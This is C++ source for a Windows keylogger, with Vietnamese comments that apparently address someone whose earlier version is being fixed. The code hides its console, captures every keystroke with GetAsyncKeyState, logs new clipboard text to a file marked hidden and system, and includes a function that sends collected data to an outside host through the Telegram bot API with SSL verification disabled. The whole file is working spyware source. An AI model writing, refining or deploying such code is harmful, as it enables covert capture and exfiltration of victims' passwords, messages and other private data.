#include <windows.h>
#include <iostream>
#include <fstream>
#include <string>
#include <chrono>
#include <thread>
#include <tlhelp32.h> // Thêm thư viện này cho các hàm hệ thống
#include <curl/curl.h>

using namespace std;

// Biến toàn cục
string buffer;
string lastClipboard; // Để kiểm tra clipboard có gì mới không
const size_t MAX_BUFFER_SIZE = 100;
const char* LOG_FILE = "keylog.txt";

// 1. Hàm ẩn file (vẫn giữ nguyên ý tưởng của bạn)
void HideFile(const char* filePath) {
    SetFileAttributesA(filePath, FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_HIDDEN);
}

// 2. Hàm ghi file (Fix lỗi ghi đè và Clear buffer)
void WriteToFile() {
    if (buffer.empty()) return;
    ofstream logFile(LOG_FILE, ios::app);
    if (logFile.is_open()) {
        logFile << buffer;
        logFile.close();
        buffer.clear();
    }
}

// 3. Hàm xử lý Clipboard (Chỉ ghi khi có dữ liệu MỚI)
void LogClipboard() {
    if (OpenClipboard(NULL)) {
        HANDLE hData = GetClipboardData(CF_TEXT);
        if (hData != NULL) {
            char* pszText = static_cast<char*>(GlobalLock(hData));
            if (pszText != NULL) {
                string currentClipboard(pszText);
                if (currentClipboard != lastClipboard) { // Chỉ ghi nếu nội dung thay đổi
                    ofstream logFile(LOG_FILE, ios::app);
                    logFile << "\n[CLIPBOARD]: " << currentClipboard << "\n";
                    lastClipboard = currentClipboard;
                }
                GlobalUnlock(hData);
            }
        }
        CloseClipboard();
    }
}

// 4. Hàm gửi Telegram (Sửa logic CURL)
void SendToTelegram(string message) {
    CURL* curl = curl_easy_init();
    if (curl) {
        string token = "YOUR_BOT_TOKEN";
        string chat_id = "YOUR_CHAT_ID";
        string url = "https://api.telegram.org/bot" + token + "/sendMessage";
        string postFields = "chat_id=" + chat_id + "&text=" + message;

        curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
        curl_easy_setopt(curl, CURLOPT_POSTFIELDS, postFields.c_str());
        
        // Bỏ qua kiểm tra SSL nếu môi trường thiếu cert (dùng cho máy cá nhân)
        curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);

        curl_easy_perform(curl);
        curl_easy_cleanup(curl);
    }
}

// 5. Luồng gửi dữ liệu định kỳ (Thay vì chỉ ghi file, ta có thể gửi đi)
void BackgroundTask() {
    while (true) {
        this_thread::sleep_for(chrono::minutes(5));
        if (!buffer.empty()) {
            WriteToFile();
            // SendToTelegram("New logs update..."); // Mở ra nếu muốn gửi qua Telegram
        }
    }
}

int main() {
    // TÀNG HÌNH: Ẩn console ngay lập tức
    ShowWindow(GetConsoleWindow(), SW_HIDE);
    
    curl_global_init(CURL_GLOBAL_ALL); // Bắt buộc phải có khi dùng libcurl
    HideFile(LOG_FILE);

    thread bgThread(BackgroundTask);
    bgThread.detach(); // Chạy ngầm tách biệt hoàn toàn

    while (true) {
        for (int i = 8; i <= 255; i++) {
            if (GetAsyncKeyState(i) & 0x8000) {
                // Logic phím bấm
                if (i == VK_RETURN) buffer += "\n";
                else if (i == VK_TAB) buffer += "[TAB]";
                else if (i == VK_SPACE) buffer += " ";
                else if (i >= 32 && i <= 126) buffer += static_cast<char>(i);

                if (buffer.size() >= MAX_BUFFER_SIZE) WriteToFile();

                while (GetAsyncKeyState(i) & 0x8000) Sleep(10);
            }
        }
        LogClipboard(); // Kiểm tra clipboard mỗi vòng lặp
        Sleep(10);
    }

    curl_global_cleanup();
    return 0;
}